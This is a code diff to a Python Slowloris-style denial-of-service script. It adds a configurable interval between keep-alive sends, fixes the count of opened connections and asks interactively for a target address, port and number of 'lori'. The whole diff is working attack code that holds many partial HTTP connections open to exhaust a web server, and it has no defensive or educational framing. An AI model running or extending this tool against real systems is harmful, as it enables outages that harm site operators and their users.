@@ -8,6 +8,7 @@ class Loris():
     running = True
     primerSent = True
     id = None
+    timeout = None
 
     def send(self, data):
         try:
@@ -17,14 +18,14 @@ class Loris():
             return False
 
     def attack(self):
-        print(str(self.id)+" is attack")
+        print(str(self.id)+" is attacking")
         self.running = True
         self.send(("GET "+self.rHost+" HTTP/1.0\n"))
         while(self.running):
             self.send(" ")
-            time.sleep(10)
+            time.sleep(int(self.timeout))
 
-    def __init__(self, rHost, rPort, id):
+    def __init__(self, rHost, rPort, id, timeout):
         self.rHost = rHost
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
@@ -33,23 +34,28 @@ class Loris():
             self.running = False
             return
         self.thread = _thread.start_new_thread(self.attack, ())
-        self.id = id+1
+        self.id = id
+        self.timeout = timeout
 
 def Main():
     lori = []
     running = True
     numberOfLori = input("How many lori? ")
     addr = input("What is the target's Address? ")
-    port = input("What is the target's Port?")
+    port = input("What is the target's Port? ")
+    timeout = input("How long should the packet Intervals be? ")
+    
+    if int(timeout) <= 3:
+        timeout = int(timeout)+3
+        
 
-
-    for x in range(int(numberOfLori)-1):
-        Loris(addr, int(port), x)
+    for x in range(int(numberOfLori)):
+        Loris(addr, int(port), x+1, timeout)
         if(not Loris.running):
             print("Loris Could Not Connect Stopping Attack")
             break
         lori.append(Loris)
-
+        
     while(running):
         time.sleep(1)
         command = input(">> ")
